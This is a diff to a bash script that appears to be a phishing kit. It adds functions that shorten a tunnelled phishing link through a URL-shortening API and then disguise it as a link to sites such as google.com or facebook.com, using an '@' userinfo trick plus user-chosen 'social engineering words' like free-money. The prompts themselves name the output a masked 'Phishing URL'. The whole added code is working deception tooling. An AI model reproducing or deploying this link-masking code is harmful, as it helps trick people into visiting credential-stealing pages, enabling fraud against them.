@@ -17,7 +17,7 @@ clear
 echo -e $'' 
 clear
 logo1
-logo_text
+select_url
 echo ""
 
 
@@ -412,6 +412,257 @@ l_logo
 all_links
 			   
 fi
+}
+
+
+
+
+function url_checker() {
+        if [ ! "${1//:*}" = http ]; then
+	        if [ ! "${1//:*}" = https ]; then
+			echo
+                        printf "${red} Invalid URL. Please use http or https. \n "
+                        exit 1
+		fi
+	fi
+}
+
+
+# URL_SHORTNER
+function url_shortner_c() {
+        rm -rf uri.log log.URI 
+	#short=$(curl -s http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=${ngrok_url})
+	#short=$(curl -s https://vurl.com/api.php?url=${ngrok_url})
+	#derek=$(curl -s https://is.gd/create.php\?format\=simple\&url=${link})
+        #checking for is.gd is working or not.
+        if [[ $derek == https://is.gd/[-0-9a-zA-Z]* ]]; then
+        shorter=${derek#https://}
+        else
+        #short=$(curl -s https://soo.gd/api.php?url=${clink})
+        curl -s https://api.shrtco.de/v2/shorten?url=${clink} >> log.URI 
+        grep -o 'https:[^"]*' log.URI >> bURI
+        rm log.URI
+        sed 's/\\//g' bURI >> uri.log
+        rm bURI
+        short=$(grep -o 'https://9qr.de/[-0-9a-zA-Z]*' "uri.log")
+        shorter=${short#https://}
+        fi
+echo -e ""
+echo -e  '\e[91m[\e[92m*\e[91m]\e[93m\e[1m Domain to mask the Phishing URL \e[21m\e[0m: \e[91m(Ex:\e[96m https://google.com , http://facebook.com)\e[0m '
+echo -e ""
+echo -en "\e[32m =>\e[0m "
+        read -p $' \033[1;93  Enter Link :\e[0m ' mask
+        url_checker $mask
+echo -e ""
+echo -e " \e[91m[\e[92m*\e[91m] \e[93m\e[1mType social engineering words : \e[21m\e[0m\e[91m(Ex:\e[96m like, free-money, free-insta-followers)"
+echo -e ' \e[32m Dont use space just use\e[97m - \e[32mbetween social engineering words\e[0m '
+echo -e ""
+echo -en "\e[32m=>\e[0m "
+        read -p $'\e[1;92mMasking \033[1;97m>> \e[1;37mEnter your words here :\e[0m ' words
+        final_url=$mask-$words@$shorter
+echo -e " \e[91m[\e[92m★\e[91m] \e[93mYour Masking URL/Link:\e[32m ${final_url} \e[0m\n"
+echo -e ""
+echo -e ""
+}
+
+function url_shortner_ng() {
+        rm -rf uri.log log.URI 
+	#short=$(curl -s http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=${ngrok_url})
+	#short=$(curl -s https://vurl.com/api.php?url=${ngrok_url})
+	#derek=$(curl -s https://is.gd/create.php\?format\=simple\&url=${link})
+        #checking for is.gd is working or not.
+        if [[ $derek == https://is.gd/[-0-9a-zA-Z]* ]]; then
+        shorter=${derek#https://}
+        else
+        #short=$(curl -s https://soo.gd/api.php?url=${nlink})
+        curl -s https://api.shrtco.de/v2/shorten?url=${nlink} >> log.URI 
+        grep -o 'https:[^"]*' log.URI >> bURI
+        rm log.URI
+        sed 's/\\//g' bURI >> uri.log
+        rm bURI
+        short=$(grep -o 'https://9qr.de/[-0-9a-zA-Z]*' "uri.log")
+        shorter=${short#https://}
+        fi
+echo -e ""
+echo -e  '\e[91m[\e[92m*\e[91m]\e[93m\e[1m Domain to mask the Phishing URL \e[21m\e[0m: \e[91m(Ex:\e[96m https://google.com , http://facebook.com)\e[0m '
+echo -e ""
+echo -en "\e[32m =>\e[0m "
+        read -p $' \033[1;93  Enter Link :\e[0m ' mask
+        url_checker $mask
+echo -e ""
+echo -e " \e[91m[\e[92m*\e[91m] \e[93m\e[1mType social engineering words : \e[21m\e[0m\e[91m(Ex:\e[96m like, free-money, free-insta-followers)"
+echo -e ' \e[32m Dont use space just use\e[97m - \e[32mbetween social engineering words\e[0m '
+echo -e ""
+echo -en "\e[32m=>\e[0m "
+        read -p $'\e[1;92mMasking \033[1;97m>> \e[1;37mEnter your words here :\e[0m ' words
+        final_url=$mask-$words@$shorter
+echo -e " \e[91m[\e[92m★\e[91m] \e[93mYour Masking URL/Link:\e[32m ${final_url} \e[0m\n"
+echo -e ""
+echo -e ""
+}
+
+function url_shortner_l() {
+        rm -rf uri.log log.URI 
+	#short=$(curl -s http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=${ngrok_url})
+	#short=$(curl -s https://vurl.com/api.php?url=${ngrok_url})
+	#derek=$(curl -s https://is.gd/create.php\?format\=simple\&url=${llink})
+        #checking for is.gd is working or not.
+        if [[ $derek == https://is.gd/[-0-9a-zA-Z]* ]]; then
+        shorter=${derek#https://}
+        else
+        #short=$(curl -s https://soo.gd/api.php?url=${llink})
+        curl -s https://api.shrtco.de/v2/shorten?url=${llink} >> log.URI 
+        grep -o 'https:[^"]*' log.URI >> bURI
+        rm log.URI
+        sed 's/\\//g' bURI >> uri.log
+        rm bURI
+        short=$(grep -o 'https://9qr.de/[-0-9a-zA-Z]*' "uri.log")
+        shorter=${short#https://}
+        fi
+echo -e ""
+echo -e ' \e[91m[\e[92m*\e[91m]\e[93m\e[1m Domain to mask the Phishing URL \e[21m\e[0m: \e[91m(Ex:\e[96m https://google.com , http://facebook.com)\e[0m'
+echo -e ""
+echo -en "\e[32m =>\e[0m "
+        read -p $' \033[1;93  Enter Link :\e[0m ' mask
+        url_checker $mask
+echo -e ""
+echo -e " \e[91m[\e[92m*\e[91m] \e[93m\e[1mType social engineering words : \e[21m\e[0m\e[91m(Ex:\e[96m like, free-money, free-insta-followers)"
+echo -e ' \e[32m Dont use space just use\e[97m - \e[32mbetween social engineering words\e[0m'
+echo -e ""
+echo -en "\e[32m=>\e[0m "
+        read -p $'\e[1;92mMasking \033[1;97m>> \e[1;37mEnter your words here :\e[0m ' words
+        final_url=$mask-$words@$shorter
+echo -e " \e[91m[\e[92m★\e[91m] \e[93mYour Masking URL/Link:\e[32m ${final_url} \e[0m\n"
+echo -e ""
+echo -e ""
+}
+
+
+function url_shortner_lhrlife() {
+        rm -rf uri.log log.URI 
+	#short=$(curl -s http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=${ngrok_url})
+	#short=$(curl -s https://vurl.com/api.php?url=${ngrok_url})
+	#derek=$(curl -s https://is.gd/create.php\?format\=simple\&url=${lhrlifelink})
+        #checking for is.gd is working or not.
+        if [[ $derek == https://is.gd/[-0-9a-zA-Z]* ]]; then
+        shorter=${derek#https://}
+        else
+        #short=$(curl -s https://soo.gd/api.php?url=${lhrlifelink})
+        curl -s https://api.shrtco.de/v2/shorten?url=${lhrlifelink} >> log.URI 
+        grep -o 'https:[^"]*' log.URI >> bURI
+        rm log.URI
+        sed 's/\\//g' bURI >> uri.log
+        rm bURI
+        short=$(grep -o 'https://9qr.de/[-0-9a-zA-Z]*' "uri.log")
+        shorter=${short#https://}
+        fi
+echo -e ""
+echo -e ' \e[91m[\e[92m*\e[91m]\e[93m\e[1m Domain to mask the Phishing URL \e[21m\e[0m: \e[91m(Ex:\e[96m https://google.com , http://facebook.com)\e[0m'
+echo -e ""
+echo -en "\e[32m =>\e[0m "
+        read -p $' \033[1;93  Enter Link :\e[0m ' mask
+        url_checker $mask
+echo -e ""
+echo -e " \e[91m[\e[92m*\e[91m] \e[93m\e[1mType social engineering words : \e[21m\e[0m\e[91m(Ex:\e[96m like, free-money, free-insta-followers)"
+echo -e ' \e[32m Dont use space just use\e[97m - \e[32mbetween social engineering words\e[0m'
+echo -e ""
+echo -en "\e[32m=>\e[0m "
+        read -p $'\e[1;92mMasking \033[1;97m>> \e[1;37mEnter your words here :\e[0m ' words
+        final_url=$mask-$words@$shorter
+echo -e " \e[91m[\e[92m★\e[91m] \e[93mYour Masking URL/Link:\e[32m ${final_url} \e[0m\n"
+echo -e ""
+echo -e ""
+}
+
+
+function askuri_c() {
+echo ""
+read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Do You Want To Modify This Url \e[1;91m (Y/N) : \e[0m' option
+echo""
+echo""
+echo""
+
+if [[ $option == "Y" || $option == "y" || $option == "yes" ]]; then
+url_shortner_c
+
+fi
+
+if [[ $option == "N" || $option == "n" || $option == "no" ]]; then
+clear
+echo""
+echo""
+
+fi
+
+echo ""
+}
+
+
+function askuri_nc() {
+echo ""
+read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Do You Want To Modify This Url \e[1;91m (Y/N) : \e[0m' option
+echo""
+echo""
+echo""
+
+if [[ $option == "Y" || $option == "y" || $option == "yes" ]]; then
+url_shortner_ng
+
+fi
+
+if [[ $option == "N" || $option == "n" || $option == "no" ]]; then
+clear
+echo""
+echo""
+
+fi
+
+echo ""
+}
+
+
+function askuri_l() {
+echo ""
+read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Do You Want To Modify This Url \e[1;91m (Y/N) : \e[0m' option
+echo""
+echo""
+echo""
+
+if [[ $option == "Y" || $option == "y" || $option == "yes" ]]; then
+url_shortner_l
+
+fi
+
+if [[ $option == "N" || $option == "n" || $option == "no" ]]; then
+clear
+echo""
+echo""
+
+fi
+
+echo ""
+}
+
+function askuri_lhrlife() {
+echo ""
+read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Do You Want To Modify This Url \e[1;91m (Y/N) : \e[0m' option
+echo""
+echo""
+echo""
+
+if [[ $option == "Y" || $option == "y" || $option == "yes" ]]; then
+url_shortner_lhrlife
+
+fi
+
+if [[ $option == "N" || $option == "n" || $option == "no" ]]; then
+clear
+echo""
+echo""
+
+fi
+
+echo ""
 }
 
 
